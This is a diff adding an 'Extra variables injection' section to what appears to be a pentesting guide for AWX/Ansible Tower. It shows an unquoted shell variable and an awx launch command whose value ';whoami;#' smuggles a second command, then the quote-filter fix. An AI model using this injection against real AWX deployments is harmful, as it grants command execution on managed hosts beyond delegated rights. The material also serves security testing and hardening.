@@ -310,3 +310,51 @@ PROJECT_ID="10"
 REQUEST_BIN="http://example.com:5000/"
 awx projects 
 ```
+
+## Extra variables injection
+
+**Extra variables** provided at the launch of a job_template [take precedence over all other sources of variables](https://docs.ansible.com/ansible-tower/latest/html/userguide/job_templates.html#extra-variables).
+This makes it possible to override variables even if they were not intented to be specified at this level.
+The variable could already be defined and it would still be overriden by the extra variables coming from the launch.
+This is therefore exploitable when variables are used in insecure ways.
+
+Here is an example of an insecure use of a variable : 
+
+```yml
+---
+- name: read a file 
+  hosts: all 
+  vars:
+    filepath: /etc/passwd
+  tasks:
+    - name: Show a file's contents
+      ansible.builtin.shell: |
+        cat '{{ filepath }}'
+```
+
+The code above will execute the `cat` command on the file specified in the `filepath` extra variable.
+In this example, the `job_template` only allows the launcher to specify the extra variables.
+
+It would then be possible to exploit the playbook by using the following `awx` command :
+
+```bash
+EXTRA_VARS="{\"filepath\": \"';whoami;#\"}"
+awx job_template launch --extra_vars "${EXTRA_VARS}" <job_template_id>
+```
+
+This would then cause a command injection when this task is processed.
+
+```bash
+cat '{{ filepath }}' --> cat '';whoami;#
+```
+
+Since the playbook did not use the [quote](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/quote_filter.html) filter to escape the variable for safe shell use, we are able to escape the quotes and inject our command.
+Changing the template command to the following will fix this vulnerability :
+
+```bash
+cat '{{ filepath | quote }}'
+```
+
+This is useful when you are constrained in what you can change about the job_template you have execution rights on.
+Most of the time, this is when a system administrators has delegated certain job_templates to an actor for their work related activities.
+
